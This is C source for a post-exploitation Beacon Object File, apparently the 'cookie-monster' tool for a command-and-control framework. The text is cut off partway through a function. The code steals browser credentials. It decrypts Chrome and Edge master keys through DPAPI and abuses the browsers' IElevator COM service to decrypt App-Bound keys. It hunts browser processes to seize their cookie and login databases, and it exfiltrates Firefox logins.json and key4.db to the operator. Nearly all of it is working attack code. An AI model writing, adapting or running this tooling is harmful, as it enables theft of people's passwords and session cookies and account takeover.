#include <windows.h>
#include <stdint.h> 
#include <ctype.h>
#include <stdio.h>
#include <tlhelp32.h>
#include "cookie-monster-bof.h"
#include "adaptix.h"

// Function declarations
BOOL download_file(IN LPCSTR fileName, IN char fileData[], IN ULONG32 fileLength);
BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName, CHAR * folderPath);

WINBASEAPI DWORD   WINAPI KERNEL32$GetLastError (VOID);
WINBASEAPI HANDLE  WINAPI KERNEL32$CreateFileA (LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
WINBASEAPI BOOL WINAPI KERNEL32$WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
WINBASEAPI DWORD   WINAPI KERNEL32$GetFileSize (HANDLE hFile, LPDWORD lpFileSizeHigh);
WINBASEAPI HGLOBAL WINAPI KERNEL32$GlobalAlloc (UINT uFlags, SIZE_T dwBytes);
WINBASEAPI HGLOBAL WINAPI KERNEL32$GlobalReAlloc (HGLOBAL hMem, SIZE_T dwBytes, UINT uFlags);
WINBASEAPI BOOL WINAPI    KERNEL32$ReadFile (HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
WINBASEAPI BOOL WINAPI    KERNEL32$CloseHandle (HANDLE hObject);
WINBASEAPI char* __cdecl  MSVCRT$strstr (char* _String, const char* _SubString);
WINBASEAPI size_t __cdecl MSVCRT$strlen (const char *s);
DECLSPEC_IMPORT PCHAR __cdecl MSVCRT$strchr(const char *haystack, int needle);
WINBASEAPI int __cdecl MSVCRT$sprintf(char *__stream, const char *__format, ...);
WINBASEAPI int __cdecl MSVCRT$_snprintf(char * __restrict__ _Dest,size_t _Count,const char * __restrict__ _Format,...);
WINBASEAPI void *__cdecl MSVCRT$memcpy(void * __restrict__ _Dst,const void * __restrict__ _Src,size_t _MaxCount);

WINADVAPI WINBOOL WINAPI ADVAPI32$RevertToSelf();
WINBASEAPI HLOCAL WINAPI KERNEL32$LocalFree(HLOCAL hMem);
WINADVAPI WINBOOL WINAPI ADVAPI32$OpenProcessToken (HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
WINADVAPI WINBOOL WINAPI ADVAPI32$DuplicateTokenEx(HANDLE,DWORD,LPSECURITY_ATTRIBUTES,SECURITY_IMPERSONATION_LEVEL,TOKEN_TYPE,PHANDLE);
WINADVAPI WINBOOL WINAPI ADVAPI32$ImpersonateLoggedOnUser(HANDLE);
WINBASEAPI LPSTR WINAPI SHLWAPI$StrStrIA(LPCSTR lpFirst,LPCSTR lpSrch);

WINBASEAPI int __cdecl MSVCRT$memcmp(const void *_Buf1,const void *_Buf2,size_t _Size);
WINBASEAPI char* __cdecl  MSVCRT$strncpy (char * __dst, const char * __src, size_t __n);
WINBASEAPI char* __cdecl  MSVCRT$strncat (char * _Dest,const char * _Source, size_t __n);
DECLSPEC_IMPORT int WINAPI MSVCRT$strcmp(const char*, const char*);
WINBASEAPI BOOL  WINAPI   CRYPT32$CryptUnprotectData (DATA_BLOB *pDataIn, LPWSTR *ppszDataDescr, DATA_BLOB *pOptionalEntropy, PVOID pvReserved, CRYPTPROTECT_PROMPTSTRUCT *pPromptStruct, DWORD dwFlags, DATA_BLOB *pDataOut);
WINBASEAPI wchar_t *__cdecl MSVCRT$wcsncpy(wchar_t * __restrict__ _Dest, const wchar_t * __restrict__ _Source, size_t _Count);
WINBASEAPI int __cdecl MSVCRT$_wcsicmp(const wchar_t *_Str1, const wchar_t *_Str2);
WINBASEAPI HGLOBAL WINAPI KERNEL32$GlobalFree (HGLOBAL hMem);
WINBASEAPI HANDLE WINAPI  KERNEL32$CreateToolhelp32Snapshot(DWORD dwFlags,DWORD th32ProcessID);
WINBASEAPI BOOL WINAPI    KERNEL32$Process32First(HANDLE hSnapshot,LPPROCESSENTRY32 lppe);
WINBASEAPI BOOL WINAPI    KERNEL32$Process32Next(HANDLE hSnapshot,LPPROCESSENTRY32 lppe);
// WINBASEAPI HANDLE WINAPI  KERNEL32$GetCurrentProcess (VOID);
WINBASEAPI DWORD WINAPI KERNEL32$GetFileType(HANDLE hFile);
WINBASEAPI BOOL WINAPI    KERNEL32$DuplicateHandle (HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwOptions);
WINBASEAPI HANDLE WINAPI  KERNEL32$OpenProcess (DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
WINBASEAPI BOOL WINAPI    CRYPT32$CryptStringToBinaryA (LPCSTR pszString, DWORD cchString, DWORD dwFlags, BYTE *pbBinary, DWORD *pcbBinary, DWORD *pdwSkip, DWORD *pdwFlags);
//WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress (HMODULE hModule, LPCSTR lpProcName);
//WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA (LPCSTR lpLibFileName);
WINBASEAPI DWORD WINAPI   KERNEL32$SetFilePointer (HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
//WINBASEAPI VOID WINAPI    KERNEL32$SetLastError (DWORD dwErrCode);
DECLSPEC_IMPORT NTSTATUS WINAPI NTDLL$NtQuerySystemInformation(int SystemInformationClass,PVOID SystemInformation,ULONG SystemInformationLength,PULONG ReturnLength);
WINBASEAPI void __cdecl MSVCRT$memset(void *dest, int c, size_t count);
WINBASEAPI BOOL WINAPI KERNEL32$HeapFree (HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap (VOID);
WINBASEAPI LPVOID WINAPI KERNEL32$HeapAlloc (HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtQueryObject(HANDLE, OBJECT_INFORMATION_CLASS, PVOID, ULONG, PULONG);

WINBASEAPI BSTR WINAPI OLEAUT32$SysAllocStringByteLen(LPCSTR psz,UINT len);
WINBASEAPI void WINAPI OLEAUT32$SysFreeString(BSTR);
WINBASEAPI UINT WINAPI OLEAUT32$SysStringByteLen(BSTR bstr);

DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitializeEx (LPVOID pvReserved, DWORD dwCoInit);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoUninitialize (void);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateInstance (REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID *ppv);
DECLSPEC_IMPORT	HRESULT WINAPI OLE32$CoSetProxyBlanket(IUnknown* pProxy, DWORD dwAuthnSvc, DWORD dwAuthzSvc, OLECHAR* pServerPrincName, DWORD dwAuthnLevel, DWORD dwImpLevel, RPC_AUTH_IDENTITY_HANDLE pAuthInfo, DWORD dwCapabilities);
WINBASEAPI void __cdecl MSVCRT$free(void *_Memory);
WINBASEAPI void* WINAPI MSVCRT$malloc(SIZE_T);
DECLSPEC_IMPORT SECURITY_STATUS WINAPI NCRYPT$NCryptFreeObject (NCRYPT_HANDLE hObject);
DECLSPEC_IMPORT SECURITY_STATUS WINAPI NCRYPT$NCryptDecrypt (NCRYPT_KEY_HANDLE hKey, PBYTE pbInput, DWORD cbInput, VOID *pPaddingInfo, PBYTE pbOutput, DWORD cbOutput, DWORD *pcbResult, DWORD dwFlags);
DECLSPEC_IMPORT SECURITY_STATUS WINAPI NCRYPT$NCryptOpenKey (NCRYPT_PROV_HANDLE hProvider, NCRYPT_KEY_HANDLE *phKey, LPCWSTR pszKeyName, DWORD dwLegacyKeySpec, DWORD dwFlags);
DECLSPEC_IMPORT SECURITY_STATUS WINAPI NCRYPT$NCryptOpenStorageProvider (NCRYPT_PROV_HANDLE *phProvider, LPCWSTR pszProviderName, DWORD dwFlags);

DECLSPEC_IMPORT HRESULT WINAPI SHELL32$SHGetFolderPathA(HWND hwnd, int csidl, HANDLE hToken, DWORD dwFlags, LPSTR pszPath);
WINBASEAPI BOOL WINAPI SHLWAPI$PathAppendA(LPCSTR pszPath, LPCSTR pszMore);
WINBASEAPI int __cdecl MSVCRT$rand();
WINBASEAPI void __cdecl MSVCRT$srand(int initial);
WINBASEAPI time_t __cdecl MSVCRT$time(time_t *time);
WINBASEAPI size_t __cdecl MSVCRT$strnlen(const char *_Str,size_t _MaxCount);

//#define IMPORT_RESOLVE FARPROC SHGetFolderPath = Resolver("shell32", "SHGetFolderPathA"); \
//    FARPROC PathAppend = Resolver("shlwapi", "PathAppendA"); \
//    FARPROC srand = Resolver("msvcrt", "srand");\
//    FARPROC time = Resolver("msvcrt", "time");\
//    FARPROC strnlen = Resolver("msvcrt", "strnlen");\
//    FARPROC rand = Resolver("msvcrt", "rand");\
//    FARPROC realloc = Resolver("msvcrt", "realloc");
#define intAlloc(size) KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, size)
#define intFree(addr) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, addr)
#define DATA_FREE(d, l) \
    if (d) { \
        MSVCRT$memset(d, 0, l); \
        intFree(d); \
        d = NULL; \
    }
#define CSIDL_LOCAL_APPDATA 0x001c
#define CSIDL_APPDATA 0x001a
static char* supported_browsers[] = {"chrome", "msedge", "firefox"};

//workaround for no slot for function (reduce number of Win32 APIs called)
//FARPROC Resolver(CHAR *lib, CHAR *func) {
//    FARPROC ptr = KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA(lib), func);
//    return ptr;
//}

CHAR* GetFileContent(CHAR *path, DWORD* size) {
    CHAR fullPath[MAX_PATH];
    HANDLE hFile = NULL;

    if (size) *size = 0;
    if (!path || !size) {
        return NULL;
    }

    if (path[0] == '\\') {
        BeaconPrintf(CALLBACK_OUTPUT,"[+] Appending local app data path\n");
        CHAR appdata[MAX_PATH];
        SHELL32$SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata);
        SHLWAPI$PathAppendA(appdata, path);
        MSVCRT$strncpy(fullPath, appdata, MAX_PATH - 1);
        fullPath[MAX_PATH - 1] = '\0';
    } else {
        MSVCRT$strncpy(fullPath, path, MAX_PATH - 1);
        fullPath[MAX_PATH - 1] = '\0';
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] LOOKING FOR FILE: %s", fullPath);

    //get handle to appdata
    hFile = KERNEL32$CreateFileA(fullPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE) {
        return NULL;
    }

    DWORD dwRead = 0;
    //read cookie file and return as buffer var
    DWORD dwSize = KERNEL32$GetFileSize(hFile, NULL);
    CHAR *buffer = (CHAR*)KERNEL32$GlobalAlloc(GPTR, dwSize + 1);
    KERNEL32$ReadFile(hFile, buffer, dwSize, &dwRead, NULL);
    KERNEL32$CloseHandle(hFile);

    if(dwSize != dwRead) {
        BeaconPrintf(CALLBACK_OUTPUT,"[!] file size mismatch. Expected %lu, got %lu\n", dwSize, dwRead);
        KERNEL32$GlobalFree(buffer);
        *size = 0;
        return NULL;
    }
    *size = dwSize;
    return buffer;
}

CHAR *ExtractKey(CHAR *buffer, CHAR * pattern) {
    //look for pattern with key
    //CHAR pattern[] = "\"encrypted_key\":\"";
    CHAR *start = MSVCRT$strstr(buffer, pattern);
    CHAR *end = NULL;
    CHAR *key = NULL;
    DWORD dwSize = 0;

    if(start == NULL) {
        return NULL;
    }

    // calc length of key
    start += MSVCRT$strlen(pattern);
    buffer = start;
    end = MSVCRT$strstr(buffer, "\"");

    if(end == NULL) {
        return NULL;
    }
    dwSize = end - start;

    //extract key from file
    key = (CHAR*)KERNEL32$GlobalAlloc(GPTR, dwSize + 1);
    MSVCRT$strncpy(key, buffer, dwSize);
    return key;
}

VOID GetMasterKey(CHAR *key) {
    Buffer result = {0};
    DWORD dwOut = 0;

    //calculate size of key
    if (!CRYPT32$CryptStringToBinaryA(key, 0, CRYPT_STRING_BASE64, NULL, &dwOut, NULL, NULL)) {
        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to decrypt base64 key\n");
        return;
    }
    result.data = (unsigned char*)MSVCRT$malloc(dwOut);
    if (!result.data) {
        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to allocate memory for key\n");
        return;
    }
    if (!CRYPT32$CryptStringToBinaryA(key, 0, CRYPT_STRING_BASE64, result.data, &dwOut, NULL, NULL)) {
        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to decrypt base64 key\n");
        MSVCRT$free(result.data);
        return;
    }

    if (dwOut < 5 || MSVCRT$memcmp(result.data, "DPAPI", 5) != 0) {
        BeaconPrintf(CALLBACK_ERROR,"[!] Invalid DPAPI Prefix\n");
        MSVCRT$free(result.data);
        return;
    }
    DATA_BLOB db;
    DATA_BLOB final;
    db.pbData = result.data + 5;
    db.cbData = dwOut - 5;

    //decrypt key with dpapi for current user
    if (!CRYPT32$CryptUnprotectData(&db, NULL, NULL, NULL, NULL, 0, &final)) {
        BeaconPrintf(CALLBACK_ERROR,"[!] Decrypting the key failed.\n");
        MSVCRT$free(result.data);
        return;
    }

    // return decrypted key
    CHAR *output = (CHAR*)KERNEL32$GlobalAlloc(GPTR, (final.cbData * 4) + 1);
    if (!output) {
        MSVCRT$free(result.data);
        return;
    }
    int offset = 0;
    for(DWORD i = 0; i < final.cbData; i++) {
        int written = MSVCRT$_snprintf( output + offset, (final.cbData * 4) + 1 - offset, "\\x%02x", final.pbData[i] );
        if (written < 0) break;
        offset += written;
    }
    BeaconPrintf(CALLBACK_OUTPUT,"[+] -> Decrypted Master Key: %s \n", output );

    // rewind to the start of the buffer
    MSVCRT$free(result.data);
    KERNEL32$GlobalFree(output);
    KERNEL32$LocalFree(final.pbData);
}

// https://gist.github.com/snovvcrash/caded55a318bbefcb6cc9ee30e82f824
const uint8_t kCryptAppBoundKeyPrefix[] = { 'A', 'P', 'P', 'B' };
const char* BASE64_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
#define KEY_SIZE 32

int isBase64(char c) {
    return (c >= 'A' && c <= 'Z') ||    // Uppercase letters
           (c >= 'a' && c <= 'z') ||    // Lowercase letters
           (c >= '0' && c <= '9') ||    // Digits
           (c == '+') || (c == '/');    // '+' and '/'
}

uint8_t* Base64Decode(const char* encoded_string, size_t* out_len) {
    if (!encoded_string || !out_len) {
        if (out_len) *out_len = 0;
        return NULL;
    }

    int in_len = MSVCRT$strlen(encoded_string);
    int i = 0, j = 0, in_ = 0;
    uint8_t char_array_4[4], char_array_3[3];
    size_t decoded_size = ((in_len + 3) / 4) * 3;
    uint8_t* decoded_data = (uint8_t*)MSVCRT$malloc(decoded_size);
    if (!decoded_data) {
        *out_len = 0;
        return NULL;
    }
    *out_len = 0;
    while (in_len-- && (encoded_string[in_] != '=') && isBase64(encoded_string[in_])) {
        char_array_4[i++] = encoded_string[in_]; in_++;
        if (i == 4) {
            for (i = 0; i < 4; i++) {
                char *pos = MSVCRT$strchr(BASE64_CHARS, char_array_4[i]);
                if (pos == NULL) {
                    BeaconPrintf(CALLBACK_ERROR, "[!] Invalid base64 character\n");
                    MSVCRT$free(decoded_data);
                    *out_len = 0;
                    return NULL;
                }
                char_array_4[i] = pos - BASE64_CHARS;
            }
            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

            for (i = 0; i < 3; i++)
                decoded_data[(*out_len)++] = char_array_3[i];
            i = 0;
        }
    }

    if (i) {
        for (j = i; j < 4; j++) char_array_4[j] = 0;
        for (j = 0; j < 4; j++) char_array_4[j] = MSVCRT$strchr(BASE64_CHARS, char_array_4[j]) - BASE64_CHARS;
        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

        for (j = 0; j < i - 1; j++) decoded_data[(*out_len)++] = char_array_3[j];
    }

    //BeaconPrintf(CALLBACK_OUTPUT, "Decoded Data: %s\n", decoded_data);
    return decoded_data;
}

char* BytesToHexString(const BYTE *byteArray, size_t size) {
    char *hexStr = (char*)MSVCRT$malloc((size * 4) + 1);
    if (!hexStr) return NULL;
    for (size_t i = 0; i < size; ++i) {
        int result = MSVCRT$_snprintf( hexStr + (i * 4), 5, "\\x%02x", byteArray[i] );
        if (result < 0) {
            MSVCRT$free(hexStr);
            return NULL;
        }
    }
    return hexStr;
}

VOID GetAppBoundKey(CHAR * key, CHAR * browser, const CLSID CLSID_Elevator, const IID IID_IElevator) {
    // initialize COM
    HRESULT hr = OLE32$CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) {
    	hr = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
    	if (FAILED(hr)) {
			BeaconPrintf(CALLBACK_ERROR,"[!] CoInitializeEx failed: 0x%x\n", hr);
        	return;
		}
    }
    IElevatorChrome* chromeElevator = NULL;
    IElevatorEdge* edgeElevator = NULL;
    // Create an instance of the IElevator COM object
    if (MSVCRT$strcmp(browser, "chrome") == 0){
        hr = OLE32$CoCreateInstance(&CLSID_Elevator, NULL, CLSCTX_LOCAL_SERVER, &IID_IElevator, (void**)&chromeElevator);
    }
    if (MSVCRT$strcmp(browser, "msedge") == 0){
        hr = OLE32$CoCreateInstance(&CLSID_Elevator, NULL, CLSCTX_LOCAL_SERVER, &IID_IElevator, (void**)&edgeElevator);
    }
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to create IElevator instance.\n");
        OLE32$CoUninitialize();
        return;
    }
    // Set the security blanket on the proxy
    if (MSVCRT$strcmp(browser, "chrome") == 0) {
        hr = OLE32$CoSetProxyBlanket(
            (IUnknown *) chromeElevator,
            RPC_C_AUTHN_DEFAULT,
            RPC_C_AUTHZ_DEFAULT,
            COLE_DEFAULT_PRINCIPAL,
            RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
            RPC_C_IMP_LEVEL_IMPERSONATE,
            NULL,
            EOAC_DYNAMIC_CLOAKING
        );
    }
    if (MSVCRT$strcmp(browser, "msedge") == 0) {
        hr = OLE32$CoSetProxyBlanket(
            (IUnknown *) edgeElevator,
            RPC_C_AUTHN_DEFAULT,
            RPC_C_AUTHZ_DEFAULT,
            COLE_DEFAULT_PRINCIPAL,
            RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
            RPC_C_IMP_LEVEL_IMPERSONATE,
            NULL,
            EOAC_DYNAMIC_CLOAKING
        );
    }

    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to set proxy blanket.\n");
        OLE32$CoUninitialize();
        return;
    }

    // base64 decode
    size_t encrypted_key_len;
    uint8_t* encrypted_key_with_header = Base64Decode(key, &encrypted_key_len);
    if (MSVCRT$memcmp(encrypted_key_with_header, kCryptAppBoundKeyPrefix, sizeof(kCryptAppBoundKeyPrefix)) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Invalid key header.\n");
        MSVCRT$free(encrypted_key_with_header);
        OLE32$CoUninitialize();
        return;
    }

    //remove app bound key prefix
    uint8_t *encrypted_key = (uint8_t*)MSVCRT$malloc(encrypted_key_len - sizeof(kCryptAppBoundKeyPrefix));
    MSVCRT$memcpy(encrypted_key, encrypted_key_with_header + sizeof(kCryptAppBoundKeyPrefix), encrypted_key_len - sizeof(kCryptAppBoundKeyPrefix));
    encrypted_key_len -= sizeof(kCryptAppBoundKeyPrefix);

    BSTR ciphertext_data = OLEAUT32$SysAllocStringByteLen((const char*)encrypted_key , encrypted_key_len );

    BSTR plaintext_data = NULL;
    DWORD last_error = ERROR_GEN_FAILURE;
    if (MSVCRT$strcmp(browser, "chrome") == 0){
        hr = chromeElevator->lpVtbl->DecryptData(chromeElevator,ciphertext_data, &plaintext_data, &last_error);
    }
    if (MSVCRT$strcmp(browser, "msedge") == 0){
        hr = edgeElevator->lpVtbl->DecryptData(edgeElevator,ciphertext_data, &plaintext_data, &last_error);
    }
    // return decrypted key
    if (SUCCEEDED(hr)) {
        DWORD decrypted_size = OLEAUT32$SysStringByteLen(plaintext_data);
        BeaconPrintf(CALLBACK_OUTPUT, "[+] => Decrypted App Bound Key: %s\n", BytesToHexString(plaintext_data, decrypted_size));
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "       App Bound Key Decryption failed. Last error: %lu (If error 203, beacon is most likely not operating out of correct file path)\n", last_error);
    }

    OLEAUT32$SysFreeString(plaintext_data);
    OLEAUT32$SysFreeString(ciphertext_data);

    MSVCRT$free(encrypted_key_with_header);
    MSVCRT$free(encrypted_key);
    if (MSVCRT$strcmp(browser, "chrome") == 0){
        hr = chromeElevator->lpVtbl->Release(chromeElevator);
    }
    if (MSVCRT$strcmp(browser, "msedge") == 0){
        hr = edgeElevator->lpVtbl->Release(edgeElevator);
    }

    OLE32$CoUninitialize();
    return;
}

VOID GetEncryptionKey(char * browser) {
    char * browserProcess = "";
    char * localStatePath = "";

    if (MSVCRT$strcmp(browser, "msedge") == 0){
        browserProcess = "msedge.exe";
        localStatePath = "\\Microsoft\\Edge\\User Data\\Local State";
    }
    if (MSVCRT$strcmp(browser, "chrome") == 0){
        browserProcess = "chrome.exe";
        localStatePath = "\\Google\\Chrome\\User Data\\Local State";
    }

    // now we can decrypt v10 as well, as it is not needed with the use of app bound encryption
    CHAR *app_key = NULL;
    CHAR *key = NULL;
    DWORD app_data_size = NULL;
    CHAR *app_data = GetFileContent(localStatePath, &app_data_size);
    if(app_data == NULL) {
        BeaconPrintf(CALLBACK_ERROR,"[!] Reading the file failed.\n");
        return;
    }

    CHAR pattern[] = "\"encrypted_key\":\"";
    key = ExtractKey(app_data, pattern);
    CHAR app_pattern[] =  "\"app_bound_encrypted_key\":\"";
    app_key = ExtractKey(app_data, app_pattern);
    if(key != NULL) {
        GetMasterKey(key);
    } else {
        BeaconPrintf(CALLBACK_ERROR,"[!] There's no v10 encryption key, checking v20...");
    }
    if(app_key == NULL) {
        BeaconPrintf(CALLBACK_ERROR,"[!] No appbound encryption key available\n");
        return;
    }
    if (MSVCRT$strcmp(browser, "chrome") == 0){
        GetAppBoundKey(app_key, browser, Chrome_CLSID_Elevator, Chrome_IID_IElevator);
    }
    if (MSVCRT$strcmp(browser, "msedge") == 0){
        GetAppBoundKey(app_key, browser, Edge_CLSID_Elevator, Edge_IID_IElevator);
    }
    KERNEL32$GlobalFree(app_data);

    return;
}

CHAR *GetFirefoxFile(CHAR *file, CHAR* profile){
    size_t profile_len = MSVCRT$strlen(profile);
    size_t file_len = MSVCRT$strlen(file);
    size_t total_len = profile_len + file_len + 1;

    CHAR *tempProfile = (CHAR*)KERNEL32$GlobalAlloc(GPTR, total_len);
    if (!tempProfile) return NULL;

    MSVCRT$strncpy(tempProfile, profile, profile_len);
    MSVCRT$strncat(tempProfile, file, file_len);

    return tempProfile;
}

VOID GetFirefoxInfo() {
    //get firefox key
    CHAR appdata[MAX_PATH];
    HANDLE hFile = NULL;

    //get appdata local path and append path
    SHELL32$SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata);
    SHLWAPI$PathAppendA(appdata, "\\Mozilla\\Firefox\\profiles.ini");

    //get handle to appdata
    hFile = KERNEL32$CreateFileA(appdata, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR,"[!] File not found at: %s \n", appdata);
        BeaconPrintf(CALLBACK_ERROR,"[!] Firefox not found on host\n");
        return;
    }

    CHAR *buffer = NULL;
    DWORD dwSize = 0;
    DWORD dwRead = 0;

    //read profiles.ini file and return as buffer var
    dwSize = KERNEL32$GetFileSize(hFile, NULL);
    buffer = (CHAR*)KERNEL32$GlobalAlloc(GPTR, dwSize + 1);
    KERNEL32$ReadFile(hFile, buffer, dwSize, &dwRead, NULL);
    if(dwSize != dwRead) {
        BeaconPrintf(CALLBACK_ERROR,"[!] file size mismatch.\n");
    }
    KERNEL32$CloseHandle(hFile);

    //look for pattern Default=Profiles/
    CHAR pattern[] = "Default=Profiles/";
    CHAR *start = MSVCRT$strstr(buffer, pattern);
    CHAR *end = NULL;
    if(start == NULL) {
        return;
    }

    // calc length of profile
    start += MSVCRT$strlen(pattern);
    buffer = start;
    end = MSVCRT$strstr(buffer, ".default-release");

    if(end == NULL) {
        return ;
    }
    dwSize = end - start;

    //extract profile from file
    CHAR *profile = NULL;
    profile = (CHAR*)KERNEL32$GlobalAlloc(GPTR, dwSize + 1);
    MSVCRT$strncpy(profile, buffer, dwSize);

    BeaconPrintf(CALLBACK_OUTPUT,"[+] Firefox Default Profile: %s \n", profile );

    // get path to logins.json
    CHAR *logins = NULL;
    logins = GetFirefoxFile(".default-release\\logins.json", profile);

    //check if logins.json exists
    hFile = KERNEL32$CreateFileA(logins, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR,"[!] File not found at: %s \n", logins);
        return;
    }
    else{
        BeaconPrintf(CALLBACK_OUTPUT,"[+] Firefox Stored Credentials found at: %s \n", logins);
        DWORD dwRead = 0;
        DWORD dwFileSize = KERNEL32$GetFileSize(hFile, NULL);
        CHAR *buffer = (CHAR*)KERNEL32$GlobalAlloc(GPTR, dwFileSize);
        KERNEL32$ReadFile(hFile, buffer, dwFileSize, &dwRead, NULL);
        download_file(logins, buffer, dwFileSize);
        KERNEL32$GlobalFree(buffer);
        KERNEL32$CloseHandle(hFile);
    }

    // get path to logins.json
    CHAR *database = NULL;
    database = GetFirefoxFile(".default-release\\key4.db", profile);

    //check if key4.db exists
    hFile = KERNEL32$CreateFileA(database, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR,"[!] File not found at: %s \n", database);
        return;
    }
    else{
        BeaconPrintf(CALLBACK_OUTPUT,"[+] Firefox Database found at: %s \n", database);
        DWORD dwRead = 0;
        DWORD dwFileSize = KERNEL32$GetFileSize(hFile, NULL);
        CHAR *buffer = (CHAR*)KERNEL32$GlobalAlloc(GPTR, dwFileSize);
        KERNEL32$ReadFile(hFile, buffer, dwFileSize, &dwRead, NULL);
        download_file(database, buffer, dwFileSize);
        KERNEL32$GlobalFree(buffer);
        KERNEL32$CloseHandle(hFile);
    }

}

VOID GetBrowserData(char * browser, BOOL cookie, BOOL loginData, char * folderPath) {
    //get handle to all processes
    HANDLE hSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32;
    INT processCount = 0;
    BOOL databaseStatus = FALSE;
    BOOL passwordStatus = FALSE;
    // if cookie only
    if (cookie && !loginData) {
        passwordStatus = TRUE;
    } else if (loginData && !cookie) { // Password only
        databaseStatus = TRUE;
    }
    pe32.dwSize = sizeof(PROCESSENTRY32);

    char * browserProcess = "";
    char * cookieDB = "";
    char * passwordDB = "";
    char * cookiePath = "";
    char * passwordPath = "";

    if (MSVCRT$strcmp(browser, "msedge") == 0){
        browserProcess = "msedge.exe";
        cookieDB = "EdgeCookies.db";
        passwordDB = "EdgePasswords.db";
        cookiePath = "\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies";
        passwordPath = "\\Microsoft\\Edge\\User Data\\Default\\Login Data";
    }
    if (MSVCRT$strcmp(browser, "chrome") == 0){
        browserProcess = "chrome.exe";
        cookieDB = "ChromeCookies.db";
        passwordDB = "ChromePasswords.db";
        cookiePath = "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies";
        passwordPath = "\\Google\\Chrome\\User Data\\Default\\Login Data";
    }

    //iterate through each handle to find browser process
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Looking for %s Data \n", browser);
    if(KERNEL32$Process32First(hSnap, &pe32)) {
        do {
            //BeaconPrintf(CALLBACK_OUTPUT, "Process: %s\n", pe32.szExeFile);
            if(MSVCRT$strcmp(pe32.szExeFile, browserProcess) == 0)
            {
                //edge was found, get cookies database
                processCount++;
                if (!databaseStatus){
                    if (GetBrowserFile(pe32.th32ProcessID, "Network\\Cookies", cookieDB, folderPath)){
                        databaseStatus = TRUE;
                    }
                }
                if (!passwordStatus){
                    if (GetBrowserFile(pe32.th32ProcessID, "Login Data", passwordDB, folderPath)){
                        passwordStatus = TRUE;
                    }
                }
                // Early exit if both files are found
                if (databaseStatus && passwordStatus) {
                    break;
                }
            }
        } while(KERNEL32$Process32Next(hSnap, &pe32));
        if (!databaseStatus && cookie) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Failed to locate cookies database for %s", browser);
        }
